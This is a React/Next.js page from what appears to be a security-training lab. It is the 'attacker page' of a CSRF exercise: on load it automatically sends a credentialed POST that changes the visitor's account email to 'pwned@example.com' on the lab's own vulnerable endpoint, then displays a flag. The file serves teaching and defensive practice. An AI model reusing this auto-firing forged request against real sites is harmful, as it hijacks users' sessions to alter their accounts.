'use client';

import React, { useEffect, useState, Suspense } from 'react';
import { Card } from '@/components/ui/card';
import Link from 'next/link';
import { Button } from '@/components/ui/button';

function CSRFAttackerContent() {
  const [result, setResult] = useState<{
    message?: string;
    flag?: string;
    error?: string;
  } | null>(null);

  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const res = await fetch('/api/labs/csrf-attack/change-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          credentials: 'include',
          body: JSON.stringify({ email: 'pwned@example.com' }),
        });
        const data = await res.json();
        if (!cancelled) {
          setResult({
            message: data.message,
            flag: data.flag,
            error: data.success ? undefined : data.message,
          });
        }
      } catch (e) {
        if (!cancelled) {
          setResult({ error: 'Request failed.' });
        }
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-8">
      <div className="max-w-xl mx-auto">
        <div className="mb-6">
          <Link href="/labs/csrf-attack">
            <Button variant="outline" className="border-slate-600 text-slate-200 hover:bg-slate-800">
              ← Back to CSRF Lab
            </Button>
          </Link>
        </div>
        <Card className="bg-slate-800 border-red-500/40">
          <div className="p-6">
            <h1 className="text-xl font-bold text-red-300 mb-2">Attacker page</h1>
            <p className="text-slate-400 text-sm mb-4">
              This page sends a request to the vulnerable endpoint when loaded. If you opened it while
              the victim lab is in session, the request is made with your cookies.
            </p>
            {result === null ? (
              <p className="text-slate-500 text-sm">Sending request...</p>
            ) : result.error ? (
              <p className="text-red-400 text-sm">{result.error}</p>
            ) : (
              <div className="space-y-3">
                <p className="text-slate-300 text-sm">{result.message}</p>
                {result.flag && (
                  <div className="bg-slate-900/50 border border-green-500/30 rounded p-3">
                    <p className="text-xs text-slate-400 mb-1">Flag:</p>
                    <p className="font-mono text-green-400 break-all">{result.flag}</p>
                  </div>
                )}
              </div>
            )}
          </div>
        </Card>
      </div>
    </div>
  );
}

export default function CSRFAttackerPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-8">
          <p className="text-slate-400">Loading...</p>
        </div>
      }
    >
      <CSRFAttackerContent />
    </Suspense>
  );
}
